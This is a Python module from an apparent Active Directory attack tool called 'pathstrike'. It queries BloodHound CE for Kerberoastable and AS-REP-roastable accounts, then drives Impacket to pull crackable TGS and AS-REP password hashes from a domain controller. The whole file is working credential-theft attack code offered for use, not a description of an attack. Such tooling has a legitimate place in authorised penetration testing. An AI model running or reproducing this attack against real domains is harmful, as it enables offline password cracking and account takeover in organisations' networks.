"""Kerberos attack handlers — Kerberoasting and AS-REP Roasting.

These are **standalone discovery + attack** utilities, not BloodHound
edge handlers.  They query BH CE for vulnerable accounts (users with
SPNs or DONT_REQUIRE_PREAUTH) and extract crackable hashes.

Usage via CLI::

    pathstrike kerberoast          # Extract TGS hashes
    pathstrike asreproast          # Extract AS-REP hashes
"""

from __future__ import annotations

import logging
from typing import Any

from pathstrike.bloodhound.client import BloodHoundClient
from pathstrike.bloodhound.cypher import (
    build_asrep_roastable_users_query,
    build_kerberoastable_users_query,
)
from pathstrike.config import PathStrikeConfig
from pathstrike.tools.impacket_wrapper import (
    asreproast as _run_asreproast,
    build_impacket_auth,
    build_target_string,
    kerberoast as _run_kerberoast,
)

logger = logging.getLogger("pathstrike.handlers.kerberos")


async def discover_kerberoastable_users(
    client: BloodHoundClient,
    domain: str,
) -> list[dict[str, Any]]:
    """Query BH CE for enabled users with SPNs (Kerberoastable).

    Returns:
        List of dicts with ``name`` and ``objectid`` keys.
    """
    query, _ = build_kerberoastable_users_query(domain)
    response = await client.cypher_query(query)
    return _parse_user_results(response)


async def discover_asrep_roastable_users(
    client: BloodHoundClient,
    domain: str,
) -> list[dict[str, Any]]:
    """Query BH CE for enabled users with DontReqPreauth.

    Returns:
        List of dicts with ``name`` and ``objectid`` keys.
    """
    query, _ = build_asrep_roastable_users_query(domain)
    response = await client.cypher_query(query)
    return _parse_user_results(response)


async def run_kerberoast(
    config: PathStrikeConfig,
    target_users: list[dict[str, Any]] | None = None,
) -> list[dict[str, str]]:
    """Execute Kerberoasting against discovered users.

    Args:
        config: PathStrike configuration (supplies creds, DC, domain).
        target_users: Optional list of specific users to target.
            Each dict should have a ``name`` key.  If None, requests
            TGS for all SPN accounts.

    Returns:
        List of extracted TGS hash dicts (``username``, ``spn``, ``hash``).
    """
    domain = config.domain.name
    username = config.credentials.username
    password = config.credentials.password
    nt_hash = config.credentials.nt_hash
    dc_ip = config.domain.dc_host

    auth_args = build_impacket_auth(
        domain, username, password, nt_hash,
        dc_ip=dc_ip,
    )

    all_hashes: list[dict[str, str]] = []

    if target_users:
        for user in target_users:
            user_sam = user["name"].split("@")[0]
            logger.info("Kerberoasting user: %s", user_sam)
            result = await _run_kerberoast(
                auth_args=auth_args,
                domain=domain,
                username=username,
                password=password,
                nt_hash=nt_hash,
                dc_ip=dc_ip,
                target_user=user_sam,
            )
            if result["success"] and result.get("parsed"):
                hashes = result["parsed"].get("tgs_hashes", [])
                all_hashes.extend(hashes)
                logger.info(
                    "Got %d TGS hash(es) for %s", len(hashes), user_sam,
                )
            else:
                logger.warning(
                    "Kerberoast failed for %s: %s",
                    user_sam,
                    result.get("error", "no hashes"),
                )
    else:
        # Request all SPN accounts at once
        logger.info("Kerberoasting all SPN accounts")
        result = await _run_kerberoast(
            auth_args=auth_args,
            domain=domain,
            username=username,
            password=password,
            nt_hash=nt_hash,
            dc_ip=dc_ip,
        )
        if result["success"] and result.get("parsed"):
            all_hashes = result["parsed"].get("tgs_hashes", [])
            logger.info("Got %d TGS hash(es) total", len(all_hashes))

    return all_hashes


async def run_asreproast(
    config: PathStrikeConfig,
    target_users: list[dict[str, Any]] | None = None,
) -> list[dict[str, str]]:
    """Execute AS-REP Roasting against discovered users.

    Args:
        config: PathStrike configuration.
        target_users: Optional list of specific users to target.

    Returns:
        List of extracted AS-REP hash dicts (``username``, ``hash``).
    """
    domain = config.domain.name
    username = config.credentials.username
    password = config.credentials.password
    nt_hash = config.credentials.nt_hash
    dc_ip = config.domain.dc_host

    auth_args = build_impacket_auth(
        domain, username, password, nt_hash,
        dc_ip=dc_ip,
    )

    all_hashes: list[dict[str, str]] = []

    if target_users:
        for user in target_users:
            user_sam = user["name"].split("@")[0]
            logger.info("AS-REP roasting user: %s", user_sam)
            result = await _run_asreproast(
                domain=domain,
                dc_ip=dc_ip,
                target_user=user_sam,
            )
            if result["success"] and result.get("parsed"):
                hashes = result["parsed"].get("asrep_hashes", [])
                all_hashes.extend(hashes)
                logger.info(
                    "Got %d AS-REP hash(es) for %s", len(hashes), user_sam,
                )
            else:
                logger.warning(
                    "AS-REP roast failed for %s: %s",
                    user_sam,
                    result.get("error", "no hashes"),
                )
    else:
        # Run against all vulnerable users
        logger.info("AS-REP roasting all DontReqPreauth accounts")
        result = await _run_asreproast(
            domain=domain,
            dc_ip=dc_ip,
            auth_args=auth_args,
            username=username,
            password=password,
            nt_hash=nt_hash,
        )
        if result["success"] and result.get("parsed"):
            all_hashes = result["parsed"].get("asrep_hashes", [])
            logger.info("Got %d AS-REP hash(es) total", len(all_hashes))

    return all_hashes


# ---------------------------------------------------------------------------
# Internal helpers
# ---------------------------------------------------------------------------


def _parse_user_results(response: dict[str, Any]) -> list[dict[str, Any]]:
    """Parse BH CE Cypher response into a list of user info dicts."""
    users: list[dict[str, Any]] = []
    raw_data = response.get("data", {})

    if isinstance(raw_data, dict):
        # Single result — nodes dict
        nodes = raw_data.get("nodes", {})
        for _nid, node in nodes.items():
            props = {**node}
            inner = node.get("properties", {})
            if isinstance(inner, dict):
                props.update(inner)
            users.append({
                "name": props.get("name", props.get("label", "")),
                "objectid": props.get("objectId", props.get("objectid", "")),
                "enabled": props.get("enabled", True),
            })
    elif isinstance(raw_data, list):
        for row in raw_data:
            if isinstance(row, dict):
                nodes = row.get("nodes", {})
                for _nid, node in nodes.items():
                    props = {**node}
                    inner = node.get("properties", {})
                    if isinstance(inner, dict):
                        props.update(inner)
                    users.append({
                        "name": props.get("name", props.get("label", "")),
                        "objectid": props.get("objectId", props.get("objectid", "")),
                        "enabled": props.get("enabled", True),
                    })

    return users
